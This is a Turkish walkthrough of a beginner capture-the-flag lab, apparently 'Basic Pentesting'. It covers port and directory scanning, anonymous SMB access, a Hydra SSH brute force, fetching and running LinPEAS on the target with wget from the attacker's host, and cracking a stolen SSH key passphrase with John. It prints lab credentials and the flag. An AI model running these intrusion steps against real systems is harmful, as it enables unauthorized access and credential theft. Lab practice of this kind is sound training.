# Basic Pentesting CTF

## 1.Adım Ping Taraması
Hedef makinenin erişilebilir olup olmadığını kontrol etmek için bir ping taraması:
```bash
ping Machine_IP
```
## 2.Adım Nmap Tarama
Nmap ile hedef IP üzerinde port ve versiyon taraması:
```bash
nmap --top-ports 100 -sV Machine_IP
```
Nmap Tarama Sonuçları:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 13:37 EDT
Nmap scan report for Machine_IP
Host is up (0.066s latency).
Not shown: 94 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
8080/tcp open  http-proxy
```
## 3. Adım: Gobuster Taraması
Gobuster ile hedef IP üzerinde dizin taraması:
```bash
gobuster dir -u Machine_IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```
Gobuster Sonucu:

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://Machine_IP
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/development          (Status: 301) [Size: 316] [--> http://Machine_IP/development/]
/index.html           (Status: 200) [Size: 158]
/server-status        (Status: 403) [Size: 299]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```
## 4. Adım: SMB 445 Portunu Kontrol
SMB zafiyetlerini kontrol etmek için:
```bash
nmap --script="smb-vuln-*" 10.10.15.28
```
Sonuç: 
```bash
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
```
## 5. Adım: SMB Enumeration ile Anonymous Girişi
Anonymous erişim ile dosyaları kontrol ediyoruz:
```bash
smbclient //Machine_IP/anonymous
Password for [WORKGROUP\root]:
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11094416 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```
Dosyayı okuyoruz:
```bash
cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

```
## 6. Adım: Şifre için Hydra ile Bruteforce
Şifreyi bulmak için Hydra ile brute-force saldırısı yapıyoruz:
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 16 -V Machine_IP ssh
```
Sonuç:
```bash
[22][ssh] host: Machine_IP   login: jan   password: armando
```

7. Adım: SSH ile Sunucuya Bağlanma ve Yetki Yükseltme
SSH ile bağlanıyoruz ve Linpeas.sh'yi indiriyoruz:
```bash
ssh jan@Machine_IP
```
Yetki yükseltmek için öncelikle kendi makinemizde bi sunucu başlatıyoruz
```bash
python3 -m httt.server 80
```
Jan ile `/tmp` klasörüne gidiyoruz, `LinPeas`ı yüklüyoruz ve çalıştırıyoruz :
```bash
cd /tmp
wget http://tun0_ip/Linpeas.sh
chmod +x Linpeas.sh
./Linpeas.sh
```
Linpeas bize bir dosya buluyor:
```bash
Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
```
id_rsa dosyasını kendi makinemize yüklüyoruz ve `kay` kullanıcısı ile bağlanmayı deniyoruz:
```bash
ssh -i kay_id_rsa kay@Machine_IP
```
Komutu çalıştırdığımızda bizden `Enter passphrase for key 'kay_id_rsa'`i istiyor.

Bunun için `JohnTheRipper` toolunu kullanıyoruz:
```bash
/opt/JohnTheRipper/run/ssh2john.py kay_id_rsa > kay_id_rsa.txt
/opt/JohnTheRipper/run/john kay_id_rsa.txt --wordlist=/usr/share/wordlist/rockyou.txt
```
Passphrase: `beeswax`

## 8. Adım: Kay ile Sunucuya Bağlanma ve Flag
SSH ile kay kullanıcısına bağlanıyoruz:
```bash
ssh -i kay_id_rsa kay@Machine_IP
```
Kay dizinine gidiyoruz ve flagi buluyoruz:
```bash
cd /home/kay
cat pass.bak
```
Flag:
```bash
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```


















